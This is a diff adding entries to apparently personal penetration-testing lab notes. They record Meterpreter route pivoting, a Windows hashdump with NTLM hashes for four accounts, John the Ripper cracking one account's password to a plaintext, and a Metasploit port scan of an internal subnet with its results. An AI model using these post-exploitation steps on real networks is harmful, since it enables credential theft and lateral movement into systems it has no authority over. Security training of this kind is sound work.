@@ -933,6 +933,41 @@ Interface: 10.59.3.10 --- 0x10
 How do we tunnel the traffic over meterpreter session?
 https://www.blackhillsinfosec.com/use-nmap-meterpreter/
 
+added a route over meterpreter > run autoroute -s 10.59.3.0 -n 255.0.0.0
 
+hashdump on .4.17 in meterpreter: ~run hashdump~
 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:edc9be02e6139d22367f1c72d6486113:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+bob:1004:aad3b435b51404eeaad3b435b51404ee:d3ea06beca64d42948a2cb28f9583eb6:::
+charles:1005:aad3b435b51404eeaad3b435b51404ee:160d3cc9b153b5eb9647c768432adcf7:::
 
+Charles password decrypts to Jasper01
+
+*** john output
+root@kali:~/Downloads/17-admin# john -w=/usr/share/wordlists/rockyou.txt --format=nt hashdump.txt 
+Using default input encoding: UTF-8
+Loaded 4 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+                 (Guest)
+*Jasper01*         (charles)
+
+*** scan of the .3 subnet
+added a route with autoroute
+backgrounded my session
+~use auxiliary/scanner/portscan/tcp~
+~set RHOSTS 10.59.3.0-255~
+~set PORTS 22,139,445~
+~set THREADS 8~
+~run~
+
+[+] 10.59.3.10:           - 10.59.3.10:139 - TCP OPEN
+[+] 10.59.3.14:           - 10.59.3.14:22 - TCP OPEN
+[+] 10.59.3.10:           - 10.59.3.10:445 - TCP OPEN
+[+] 10.59.3.11:           - 10.59.3.11:22 - TCP OPEN
+[+] 10.59.3.13:           - 10.59.3.13:22 - TCP OPEN
+
+Next step - set up SOCKS proxy and proxychains
+
+ssh server could be 7722
